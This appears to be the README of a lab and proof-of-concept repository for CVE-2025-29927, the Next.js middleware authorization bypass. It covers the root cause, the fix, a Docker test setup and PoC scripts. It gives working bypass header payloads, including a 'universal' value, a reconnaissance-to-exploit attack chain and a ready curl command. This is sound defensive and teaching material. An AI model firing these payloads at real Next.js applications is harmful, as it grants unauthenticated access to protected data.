# CVE-2025-29927 - Next.js Middleware Authorization Bypass

> **Exploit Intelligence Platform** | [exploit-intel.com](https://exploit-intel.com) | [@exploit_intel](https://x.com/exploit_intel)

## Vulnerability Summary

| Field | Value |
|---|---|
| CVE | CVE-2025-29927 |
| Component | [Next.js](https://github.com/vercel/next.js) |
| Type | CWE-285: Improper Authorization / CWE-863: Incorrect Authorization |
| CVSS | 9.1 (Critical) — `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N` |
| EPSS | 92.9% (99.8th percentile) |
| Affected | Next.js 11.1.4 – 12.3.4, 13.0.0 – 13.5.8, 14.0.0 – 14.2.24, 15.0.0 – 15.2.2 |
| Fix | Versions [12.3.5](https://github.com/vercel/next.js/releases/tag/v12.3.5), [13.5.9](https://github.com/vercel/next.js/releases/tag/v13.5.9), [14.2.25](https://github.com/vercel/next.js/commit/5fd3ae8f8542677c6294f32d18022731eab6fe48), [15.2.3](https://github.com/vercel/next.js/commit/52a078da3884efe6501613c7834a3d02a91676d2) |
| Author | Exploit Intelligence Platform |
| Date | 2025-03-21 |

## Vulnerability Details

CVE-2025-29927 is a critical authorization bypass vulnerability in Next.js. An unauthenticated remote attacker can completely bypass all Next.js middleware — including authentication, authorization, rate limiting, and CSRF checks — by injecting a single crafted HTTP header (`x-middleware-subrequest`). The vulnerability is trivially exploitable and requires no credentials, sessions, or prior access.

Next.js uses an internal header `x-middleware-subrequest` to track middleware recursion depth. When middleware makes a sub-request via `fetch()`, the current middleware name is appended to this header. Before executing middleware, `sandbox.ts` reads the header, counts how many times the current middleware name appears, and if the count reaches `MAX_RECURSION_DEPTH` (5), skips middleware entirely by returning `x-middleware-next: 1`.

The critical flaw is that `x-middleware-subrequest` is never stripped from external incoming HTTP requests. The `filterInternalHeaders()` function strips other internal headers (`x-middleware-rewrite`, `x-middleware-redirect`, etc.) but omits `x-middleware-subrequest`. This allows any external attacker to spoof the header and trigger the recursion guard, causing middleware to be completely skipped.

```typescript
// sandbox.ts (vulnerable code in v15.2.2)
const subreq = params.request.headers[`x-middleware-subrequest`]
const subrequests = typeof subreq === 'string' ? subreq.split(':') : []

const MAX_RECURSION_DEPTH = 5
const depth = subrequests.reduce(
    (acc, curr) => (curr === params.name ? acc + 1 : acc),
    0
)

if (depth >= MAX_RECURSION_DEPTH) {
    return {
        waitUntil: Promise.resolve(),
        response: new runtime.context.Response(null, {
            headers: {
                'x-middleware-next': '1',  // SKIP MIDDLEWARE ENTIRELY
            },
        }),
    }
}
```

### Exploit Vectors by Version

| Next.js Version | Middleware Location | Bypass Header Value |
|---|---|---|
| v13+ (default) | `middleware.js` / `middleware.ts` | `middleware:middleware:middleware:middleware:middleware` |
| v13+ (src dir) | `src/middleware.js` | `src/middleware:src/middleware:src/middleware:src/middleware:src/middleware` |
| v11.1.4 – v12.3.4 | `pages/_middleware.js` | `pages/_middleware` (single value — no recursion check) |
| Universal | Any | `middleware:middleware:middleware:middleware:middleware:src/middleware:src/middleware:src/middleware:src/middleware:src/middleware:pages/_middleware` |

### Attack Chain

```
1. Identify a Next.js application (x-powered-by: Next.js, /_next/ paths, __NEXT_DATA__)
2. Find protected routes returning 401/403 or redirecting to login
3. Send request with header: x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware
4. Middleware is completely skipped — protected content returned without authentication
```

### Fix

The fix (commits [`52a078da`](https://github.com/vercel/next.js/commit/52a078da3884efe6501613c7834a3d02a91676d2) / [`5fd3ae8f`](https://github.com/vercel/next.js/commit/5fd3ae8f8542677c6294f32d18022731eab6fe48)) introduces a session-specific secret token to validate `x-middleware-subrequest` headers:

1. **`router-server.ts`**: Generates a random 8-byte hex string at startup, stored in `globalThis`
2. **`server-ipc/utils.ts`**: `filterInternalHeaders()` now strips `x-middleware-subrequest` unless the accompanying `x-middleware-subrequest-id` matches the session secret
3. **`context.ts`**: Attaches the session secret to all legitimate internal sub-request `fetch()` calls

External attackers cannot know the per-session secret, so their spoofed header is stripped before reaching the middleware sandbox. The fix is complete for standard Next.js deployments.

## Lab Setup

### Architecture

```
┌──────────────────────────────────────────┐
│  cve-2025-29927-vulnerable               │
│  Next.js 14.2.24 on node:18-slim        │
│  Middleware: auth check on /api/*        │
│  Port 3000 (host: 3100)                 │
└──────────────────────────────────────────┘
```

### Quick Start

```bash
cd CVE-2025-29927

# Build and start
docker compose build
docker compose up -d

# Run the exploit
python3 poc/poc.py localhost 3100 /api/protected

# Cleanup
docker compose down
```

### Container Details

| Container | Role | Base | Host Port | Description |
|---|---|---|---|---|
| `cve-2025-29927-vulnerable` | Vulnerable target | `node:18-slim` | `3100` | Next.js 14.2.24 with auth middleware on `/api/*` |

### Credentials

| Service | Username | Password |
|---|---|---|
| Next.js API | N/A (header auth) | `Bearer my-secret-token` |

## PoC Usage

Three PoC scripts are provided in `poc/`. All use **Python 3 stdlib only** — no external dependencies required.

### Quick Exploit (curl)

```bash
# Bypass middleware — access protected endpoint without any credentials
curl -H "x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware" \
  http://localhost:3100/api/protected
```

### `poc.py` — Standard Bypass

The primary PoC. Sends a baseline request (401), then the bypass request (200), and compares.

```bash
python3 poc/poc.py <host> <port> <path>

# Run against the lab
python3 poc/poc.py localhost 3100 /api/protected
```

### Expected Output (Vulnerable)

```
======================================================================
 CVE-2025-29927 — Next.js Middleware Authorization Bypass PoC
======================================================================

  Target: http://localhost:3100/api/protected
  Bypass Header: x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware

[Step 1] Baseline — Unauthenticated request (should be 401)
  [Baseline Response]
    HTTP Status: 401
    {"error": "Unauthorized"}

[Step 2] Exploit — Request with x-middleware-subrequest bypass header
  [Exploit Response]
    HTTP Status: 200
    {"message": "SUCCESS: You have accessed the protected API endpoint", ...}

[Step 3] Evaluation
  Baseline status: 401
  Exploit status:  200

======================================================================
  [VULNERABLE] CVE-2025-29927 CONFIRMED
======================================================================
```

### `poc_vector2.py` — Universal Bypass

Uses a single universal payload covering all possible middleware file locations (root, `src/`, `pages/`). Useful when the middleware location is unknown.

```bash
python3 poc/poc_vector2.py localhost 3100 /api/protected
```

### `poc_vector3.py` — Multi-Vector Scanner

Systematically tests 8 exploit vectors including edge cases (partial payloads, over-threshold, mixed-case headers, empty values). Reports which vectors succeed and validates each result.

```bash
python3 poc/poc_vector3.py localhost 3100 /api/protected
```

## Verification: Vulnerable vs Patched

| Test | Vulnerable (14.2.24) | Patched (14.2.25) |
|---|---|---|
| `curl /api/protected` (no auth) | `401 Unauthorized` | `401 Unauthorized` |
| `curl -H "Authorization: Bearer my-secret-token" /api/protected` | `200 OK` | `200 OK` |
| `curl -H "x-middleware-subrequest: middleware:..." /api/protected` | **`200 OK` — BYPASSED** | `401 Unauthorized` — BLOCKED |

## Files

| File | Description |
|---|---|
| `poc/poc.py` | Primary PoC — standard root middleware bypass |
| `poc/poc_vector2.py` | Universal bypass covering all middleware locations |
| `poc/poc_vector3.py` | Multi-vector scanner with 8 edge case tests |
| `Dockerfile.vulnerable` | Builds vulnerable Next.js 14.2.24 container |
| `docker-compose.yml` | Lab orchestration — single container on port 3100 |
| `vulnerable-app/` | Minimal Next.js app with auth middleware |
| `intel_brief.md` | CVE intelligence brief |
| `vulnerability_analysis.md` | Root cause analysis and fix assessment |
| `lab_build_report.md` | Lab construction documentation |
| `poc_verification_report.md` | Full test results across all vectors |

## References

- [NVD Entry](https://nvd.nist.gov/vuln/detail/CVE-2025-29927)
- [Vendor Advisory (GHSA-f82v-jwr5-mffw)](https://github.com/vercel/next.js/security/advisories/GHSA-f82v-jwr5-mffw)
- [Fix Commit (v15.x)](https://github.com/vercel/next.js/commit/52a078da3884efe6501613c7834a3d02a91676d2)
- [Fix Commit (v14.x)](https://github.com/vercel/next.js/commit/5fd3ae8f8542677c6294f32d18022731eab6fe48)
- [Release v15.2.3](https://github.com/vercel/next.js/releases/tag/v15.2.3)
- [Release v13.5.9](https://github.com/vercel/next.js/releases/tag/v13.5.9)
- [Release v12.3.5](https://github.com/vercel/next.js/releases/tag/v12.3.5)
- [ExploitDB (EDB-52124)](https://www.exploit-db.com/exploits/52124)
- [OSS-Security](http://www.openwall.com/lists/oss-security/2025/03/23/3)

## Timeline

| Date | Event |
|---|---|
| 2025-03-21 | CVE published; Next.js v15.2.3, v14.2.25, v13.5.9, v12.3.5 released |
| 2025-03-23 | Disclosed on oss-security mailing list |
| 2025-03-28 | Added to VulnCheck KEV (confirmed exploited in the wild) |

## Disclaimer

This proof-of-concept is provided for **authorized security testing and educational purposes only**. It is intended to help defenders understand, detect, and remediate CVE-2025-29927 in their environments.

**Do not** use this tool against systems you do not own or have explicit written authorization to test. Unauthorized access to computer systems is illegal in most jurisdictions and may violate laws including the Computer Fraud and Abuse Act (CFAA), the Computer Misuse Act, and equivalent legislation worldwide.

The authors assume no liability for misuse of this material. This project follows responsible disclosure practices.
